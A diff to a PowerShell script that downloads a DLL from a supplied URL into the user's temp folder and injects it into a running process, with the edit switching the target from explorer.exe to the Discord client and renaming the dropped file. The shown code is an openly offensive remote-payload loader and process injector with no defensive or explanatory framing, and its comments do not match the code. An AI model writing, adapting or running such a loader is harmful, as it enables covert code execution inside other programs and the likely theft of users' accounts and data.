@@ -8,7 +8,7 @@ param(
 )
 
 # Download the DLL and save it to %LOCALAPPDATA%\Temp\temp.txt
-$downloadPath = "$env:LOCALAPPDATA\Temp\tasdasdemp.dll"
+$downloadPath = "$env:LOCALAPPDATA\Temp\tasssdasdemp.dll"
 Invoke-WebRequest -Uri $DllUrl -OutFile $downloadPath
 
 # DLL Injection code using .NET interop (requires administrative privileges typically)
@@ -59,12 +59,12 @@ public class DllInjector
 "@
 
 # Find explorer.exe process ID (assuming one instance; in reality, there might be multiple)
-$explorerProc = Get-Process -Name explorer | Select-Object -First 1 -ExpandProperty Id
+$explorerProc = Get-Process -Name discord | Select-Object -First 1 -ExpandProperty Id
 
 # Inject the DLL into explorer.exe
 $result = [DllInjector]::InjectDll($explorerProc, $downloadPath)
 if ($result) {
-    Write-Output "DLL injected successfully into explorer.exe (PID: $explorerProc)."
+    Write-Output "DLL injected successfully into dc.exe (PID: $explorerProc)."
 } else {
     Write-Output "Failed to inject DLL. Ensure script is run as administrator and check for errors."
 }
